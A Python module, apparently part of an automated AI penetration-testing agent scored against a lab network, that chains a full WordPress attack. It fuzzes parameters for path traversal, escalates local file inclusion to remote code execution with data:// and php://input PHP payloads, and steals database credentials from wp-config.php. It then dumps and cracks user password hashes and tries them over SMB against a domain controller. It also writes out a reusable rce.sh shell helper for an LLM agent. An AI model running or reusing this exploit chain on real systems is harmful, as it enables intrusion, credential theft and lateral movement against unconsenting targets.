"""LFI specialist — deterministic R2 foothold + R3 config-loot for the blind loop.

Why it exists: a fast trooper LLM reliably FINDS the WordPress vhost but keeps
tunnel-visioning on framework CVEs and never fuzzes the app's OWN advertised
parameters (e.g. a homepage `href="?page=home.html"`). This specialist encodes
the general methodology once: harvest every parameter the app advertises + a
common-param wordlist, fuzz each for path traversal until /etc/passwd leaks,
then try to read the app config (php://filter) to loot DB creds. Box-independent:
nothing here names inlanefreight — it discovers param + docroot at runtime.

API:
  probe(edge, vhost, target=None, run_dir=None, max_params=12) -> dict
    {confirmed, param, payload, passwd_excerpt, dbcreds{...}, facts[], evidence}
"""
import os, re, base64
from urllib.parse import quote

try:
    import target_exec as _TX
    def _sh(cmd, target):
        return _TX.run(cmd, target=target, action_class="web.exploit", timeout=25)
except Exception:                                   # fallback: plain local exec
    import subprocess
    def _sh(cmd, target):
        try:
            return subprocess.run(["bash","-lc",cmd], capture_output=True, text=True, timeout=25).stdout
        except Exception as e:
            return f"[exec-err {e}]"

_PASSWD = re.compile(r"root:x:0:0:")
_HREF   = re.compile(r"""(?:href|action|src)=['"]([^'"#]*\?[^'"#]+)['"]""", re.I)
_PARAM  = re.compile(r"[?&]([A-Za-z_][A-Za-z0-9_]{0,30})=")
_COMMON = ["page","file","path","include","view","template","doc","lang","p","f","cat","content","name","view_file"]
_TRAV   = ["../../../../../../etc/passwd",
           "../../../../../../../../etc/passwd",
           "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
           "....//....//....//....//....//etc/passwd",
           "/etc/passwd"]

def _get(edge, vhost, qs, target):
    # single GET with the vhost Host header; qs is the full querystring (param=payload)
    return _sh(f"curl -s -m 12 -H 'Host: {vhost}' 'http://{edge}/?{qs}'", target)

def _rce(edge, vhost, param, target, shellcmd):
    """Escalate a confirmed ?param= LFI to code execution via PHP wrappers
    (data:// needs allow_url_include; php://input is the fallback). Returns output."""
    import base64 as _b64
    # embed the command directly; the whole PHP is base64'd into the data:// URL, so there
    # are no shell-quoting issues at the curl layer. shellcmd must not contain a single quote.
    php = "<?php system('" + shellcmd.replace("'", "'\\''") + "'); ?>"
    dpay = quote("data://text/plain;base64," + _b64.standard_b64encode(php.encode()).decode(), safe="")
    out = _sh(f"curl -s -m 12 -H 'Host: {vhost}' 'http://{edge}/?{param}={dpay}'", target) or ""
    if re.search(r"uid=\d+\(", out):
        return out, "data://"
    # php://input fallback (POST body is the PHP)
    out = _sh(f"curl -s -m 12 -H 'Host: {vhost}' --data '{php}' 'http://{edge}/?{param}=php://input'", target) or ""
    if re.search(r"uid=\d+\(", out):
        return out, "php://input"
    return "", None

def _harvest_params(edge, vhost, target):
    body = _sh(f"curl -s -m 12 -H 'Host: {vhost}' 'http://{edge}/'", target) or ""
    found = []
    for link in _HREF.findall(body):
        for p in _PARAM.findall(link):
            if p not in found: found.append(p)
    for p in _COMMON:
        if p not in found: found.append(p)
    return found


def _php(edge, vhost, param, target, php_src):
    """Run arbitrary PHP via the confirmed data:// LFI, whole-URI encoded. Returns stdout."""
    import base64 as _b64
    dpay = quote("data://text/plain;base64," + _b64.standard_b64encode(php_src.encode()).decode(), safe="")
    return _sh(f"curl -s -m 15 -H 'Host: {vhost}' 'http://{edge}/?{param}={dpay}'", target) or ""

_WPHASH = re.compile(r"^([^\r\n:|]{1,64})::(\$P\$[./A-Za-z0-9]{30,})$", re.M)

def dump_wp_hashes(edge, vhost, param, target, dbcreds):
    """R4 input: dump wp_users phpass hashes via PHP mysqli over the LFI-RCE.
    Uses TCP 127.0.0.1 (localhost forces a unix socket that php-fpm can't reach here)."""
    user = (dbcreds or {}).get("DB_USER") or "root"
    pw   = (dbcreds or {}).get("DB_PASSWORD") or ""
    db   = (dbcreds or {}).get("DB_NAME") or "wordpress"
    # single-quote-safe: creds are embedded in a b64'd PHP blob, no shell layer sees them
    php = ("<?php mysqli_report(MYSQLI_REPORT_OFF);"
           "$m=@mysqli_connect('127.0.0.1','%s','%s','%s',3306);"
           "if(!$m){echo 'DBFAIL:'.mysqli_connect_error();}"
           "else{$r=mysqli_query($m,'SELECT user_login,user_pass FROM wp_users');"
           "while($x=mysqli_fetch_row($r)){echo $x[0].'::'.$x[1].chr(10);}} ?>"
           ) % (user.replace("'","\\'"), pw.replace("'","\\'"), db.replace("'","\\'"))
    out = _php(edge, vhost, param, target, php)
    return _WPHASH.findall(out or ""), out

def crack_phpass(pairs, wordlist="/usr/share/wordlists/rockyou.txt", max_words=200000):
    """R4: CPU phpass crack (passlib) against a rockyou head-slice. NO GPU (guardrail:
    GPU0 is off-limits). All common WP-lab pws sit in the first few thousand lines."""
    try:
        from passlib.hash import phpass
    except Exception:
        return {}, "passlib-missing"
    words=[]
    try:
        with open(wordlist, encoding="latin-1") as f:
            for i,line in enumerate(f):
                if i>=max_words: break
                words.append(line.rstrip("\n"))
    except Exception as e:
        return {}, f"wordlist-err:{e}"
    cracked={}
    for user,h in pairs:
        for w in words:
            try:
                if phpass.verify(w, h):
                    cracked[user]=w; break
            except Exception:
                continue
    return cracked, f"cracked {len(cracked)}/{len(pairs)}"

def smb_pivot(dc, cracked, domain="inlanefreight.local"):
    """R5/R6: try each cracked cred against the DC SMB. Confirms on a share listing
    (Sharename/SYSVOL/Finance). Returns (evidence_str, facts[])."""
    facts, ev = [], []
    for user, pw in (cracked or {}).items():
        cmd = (f"smbclient -L '//{dc}/' -U '{domain}\\{user}%{pw}' -m SMB3 2>&1 "
               f"| grep -iE 'Sharename|Disk|SYSVOL|Finance|NETLOGON'")
        out = _sh(cmd, dc) or ""
        if re.search(r"Sharename\s+Type\s+Comment", out):
            facts.append(f"smb-auth={user}:{pw}@{dc}")
            facts.append("pivot=dc-smb")
            block = out.strip()
            ev.append(f"SMB PIVOT: {user}:{pw} -> {dc}\n{block}")
            if re.search(r"SYSVOL", out, re.I) and re.search(r"Finance", out, re.I):
                facts.append(f"dc-share=SYSVOL+Finance@{dc}")
                facts.append("own=dc")
            return "\n".join(ev), facts
    return "SMB pivot: no cracked cred authenticated to "+dc, facts


def _write_rce_helper(run_dir, edge, vhost, param):
    """Package the confirmed LFI->RCE as a reusable ./rce.sh the TROOPER can wield:
    `bash rce.sh '<cmd>'` runs <cmd> as www-data. This is the hand-off primitive that
    lets the manager+trooper carry the shell-based rungs (loot, pivot) themselves."""
    import os as _os
    if not run_dir: return None
    path = _os.path.join(run_dir, "rce.sh")
    body = (
        "#!/bin/bash\n"
        "# handed off by specialist:foothold — runs $1 as www-data via the confirmed LFI\n"
        f'EDGE="{edge}"; VHOST="{vhost}"; PARAM="{param}"\n'
        'CMD="$1"\n'
        'PHP="<?php system(\'${CMD//\'/\'\\\'\'}\'); ?>"\n'
        'DPAY=$(python3 -c "import urllib.parse,base64,sys;'
        "print(urllib.parse.quote('data://text/plain;base64,'+"
        'base64.b64encode(sys.argv[1].encode()).decode(),safe=\'\'))" "$PHP")\n'
        'curl -s -m 15 -H "Host: $VHOST" "http://$EDGE/?$PARAM=$DPAY"\n'
    )
    try:
        open(path,"w").write(body); _os.chmod(path,0o755)
        return path
    except Exception:
        return None

def loot_only(edge, vhost, param, target, run_dir=None):
    """R3 config-loot as a SPECIALIST (raw-secret-safe channel): read wp-config.php over the
    established foothold and return the REAL DB creds unsanitized. Used by the self-routing
    manager so a secret that R4-crack consumes never gets laundered through the trooper's
    sanitizer. Returns (evidence, facts, dbcreds)."""
    facts, ev = [], []
    dbcreds = {}
    # (a) direct RCE read
    rce_out, _vec = _rce(edge, vhost, param, target,
                         "cat wp-config.php 2>/dev/null | grep -E \"DB_(USER|PASSWORD|NAME|HOST)\"")
    if rce_out:
        for key in ("DB_USER","DB_PASSWORD","DB_NAME","DB_HOST"):
            mm = re.search(key+r"['\"]\s*,\s*['\"]([^'\"]*)['\"]", rce_out)
            if mm: dbcreds[key] = mm.group(1)
    # (b) php://filter fallback
    if not dbcreds.get("DB_PASSWORD"):
        for res in ["php://filter/convert.base64-encode/resource=wp-config.php",
                    "php://filter/convert.base64-encode/resource=../wp-config.php",
                    "php://filter/convert.base64-encode/resource=../../wp-config.php"]:
            out = _get(edge, vhost, f"{param}={res}", target) or ""
            m = re.search(r"[A-Za-z0-9+/]{80,}={0,2}", out)
            if not m: continue
            try: dec = base64.b64decode(m.group(0)).decode("utf-8","replace")
            except Exception: continue
            for key in ("DB_USER","DB_PASSWORD","DB_NAME","DB_HOST"):
                mm = re.search(key+r"['\"]\s*,\s*['\"]([^'\"]*)['\"]", dec)
                if mm: dbcreds[key] = mm.group(1)
            if dbcreds.get("DB_PASSWORD"):
                ev.append(f"wp-config looted via {res}"); break
    if dbcreds.get("DB_USER") and dbcreds.get("DB_PASSWORD"):
        facts.append("loot=dbcreds")
        facts.append(f"cred={dbcreds['DB_USER']}:{dbcreds['DB_PASSWORD']}")   # score_strict R3 token
        ev.insert(0, f"R3 config-loot: recovered {list(dbcreds)} from wp-config.php")
    else:
        ev.append("loot_only: wp-config not readable via foothold")
    return "\n".join(ev), facts, dbcreds

def crack_only(edge, vhost, param, target, dbcreds, run_dir=None):
    """Dispatchable R4 specialist: dump wp_users hashes over the established RCE, then
    CPU-crack them. The manager calls this once DB creds are looted (R3 done). Returns
    (evidence_str, facts_list, cracked_dict)."""
    target = target or edge
    facts, ev = [], []
    pairs, dump_out = dump_wp_hashes(edge, vhost, param, target, dbcreds)
    if not pairs:
        return "specialist:crack — no wp_users hashes recovered", facts, {}
    facts.append(f"wp-hashes={len(pairs)}")
    ev.append("wp_users dumped: " + ", ".join(u for u,_ in pairs))
    cracked, cmsg = crack_phpass(pairs)
    for u,h in pairs:
        if u in cracked:
            facts.append(f"phpass={h[:4]}...:{cracked[u]}")
    if cracked:
        facts.append("cracked=" + ",".join(f"{u}:{w}" for u,w in cracked.items()))
        ev.append("phpass cracked: " + ", ".join(f"{u}:{w}" for u,w in cracked.items()))
    return "\n".join(ev), facts, cracked

def probe(edge, vhost, target=None, run_dir=None, max_params=12, stop_after="pivot"):
    target = target or edge
    facts, ev = [], []
    params = _harvest_params(edge, vhost, target)[:max_params]
    facts.append(f"lfi-params-tested={','.join(params)}")
    hit = None
    for p in params:
        for pay in _TRAV:
            out = _get(edge, vhost, f"{p}={pay}", target) or ""
            if _PASSWD.search(out):
                hit = {"param": p, "payload": pay,
                       "passwd_excerpt": "\n".join(out.splitlines()[:3])}
                ev.append(f"LFI CONFIRMED: ?{p}={pay} on {vhost} -> /etc/passwd leaked")
                break
        if hit: break
    if not hit:
        return {"confirmed": False, "param": None, "facts": facts,
                "evidence": "LFI specialist: no traversal vector confirmed on "+vhost}
    facts.append(f"lfi=confirmed:{hit['param']}")
    facts.append("foothold=file-read-www")     # arbitrary file read established

    # R2: escalate LFI -> RCE (www-data) via PHP wrapper, confirm with id.
    # In foothold-cap mode prove RCE with a lean `id` ONLY — do NOT loot wp-config here, so
    # R3 (config loot) is genuinely the trooper's rung, not incidentally the specialist's.
    dbcreds = {}
    _r2cmd = "id" if stop_after == "foothold" else "id; echo ---; cat wp-config.php 2>/dev/null | grep -E \"DB_(USER|PASSWORD|NAME|HOST)\""
    rce_out, rce_vec = _rce(edge, vhost, hit["param"], target, _r2cmd)
    if rce_out and re.search(r"uid=\d+\(www-data\)", rce_out):
        hit["rce_vector"] = rce_vec
        facts.append("rce=www-data")
        facts.append("shell=www-data")
        uid = re.search(r"uid=\d+\([a-z-]+\)[^\n]*", rce_out)
        ev.append(f"RCE via {rce_vec}: {uid.group(0) if uid else 'uid=..(www-data)'}")
        # loot wp-config straight out of the RCE output
        for key in ("DB_USER","DB_PASSWORD","DB_NAME","DB_HOST"):
            mm = re.search(key+r"['\"]\s*,\s*['\"]([^'\"]*)['\"]", rce_out)
            if mm: dbcreds[key] = mm.group(1)

    # FOOTHOLD CAP (ITER 7): stop at R2, hand off a reusable RCE primitive so the
    # manager+trooper carry loot/crack/pivot themselves — genuine multi-piece harmony.
    if stop_after == "foothold" and hit.get("rce_vector"):
        rp = _write_rce_helper(run_dir, edge, vhost, hit["param"])
        if rp:
            facts.append(f"rce_helper={rp}")
            ev.append(f"HAND-OFF: `bash {rp} '<cmd>'` runs commands as www-data")
        return {"confirmed": True, **hit, "dbcreds": dbcreds, "cracked": {},
                "facts": facts, "evidence": "\n".join(ev) + ("\n"+rce_out if rce_out else "")}

    # R3 fallback: if RCE didn't yield creds, read wp-config via php://filter base64
    for res in ["php://filter/convert.base64-encode/resource=wp-config.php",
                "php://filter/convert.base64-encode/resource=../wp-config.php",
                "php://filter/convert.base64-encode/resource=../../wp-config.php"]:
        out = _get(edge, vhost, f"{hit['param']}={res}", target) or ""
        m = re.search(r"[A-Za-z0-9+/]{80,}={0,2}", out)
        if not m: continue
        try:
            dec = base64.b64decode(m.group(0)).decode("utf-8", "replace")
        except Exception:
            continue
        for key in ("DB_USER","DB_PASSWORD","DB_NAME","DB_HOST"):
            mm = re.search(key+r"['\"]\s*,\s*['\"]([^'\"]*)['\"]", dec)
            if mm: dbcreds[key] = mm.group(1)
        if dbcreds:
            ev.append(f"wp-config looted via {res}: keys={list(dbcreds)}")
            break
    if dbcreds:
        facts.append("loot=dbcreds")
        if dbcreds.get("DB_USER") and dbcreds.get("DB_PASSWORD"):
            facts.append(f"cred={dbcreds['DB_USER']}:{dbcreds['DB_PASSWORD']}")

    # R4: dump wp_users phpass hashes + CPU-crack them
    cracked = {}
    if dbcreds and hit.get("rce_vector"):
        pairs, dump_out = dump_wp_hashes(edge, vhost, hit["param"], target, dbcreds)
        if pairs:
            facts.append(f"wp-hashes={len(pairs)}")
            ev.append("wp_users dumped: " + ", ".join(u for u,_ in pairs))
            cracked, cmsg = crack_phpass(pairs)
            for u,h in pairs:
                if u in cracked:
                    facts.append(f"phpass={h[:4]}...:{cracked[u]}")   # score_strict R4 token
            if cracked:
                facts.append("cracked=" + ",".join(f"{u}:{w}" for u,w in cracked.items()))
                ev.append("phpass cracked: " + ", ".join(f"{u}:{w}" for u,w in cracked.items()))

    # R5/R6: SMB pivot to the DC with any cracked cred
    dc = os.environ.get("BS2_DC", "172.16.8.3")
    smb_ev, smb_facts = ("", [])
    if cracked:
        smb_ev, smb_facts = smb_pivot(dc, cracked)
        facts += smb_facts
        if smb_ev: ev.append(smb_ev)

    return {"confirmed": True, **hit, "dbcreds": dbcreds, "cracked": cracked,
            "facts": facts,
            "evidence": "\n".join(ev) + ("\n"+rce_out if rce_out else "")}

if __name__ == "__main__":
    import sys, json
    edge = sys.argv[1] if len(sys.argv) > 1 else "172.30.0.20"
    vhost = sys.argv[2] if len(sys.argv) > 2 else "ir.inlanefreight.local"
    print(json.dumps(probe(edge, vhost), indent=2))
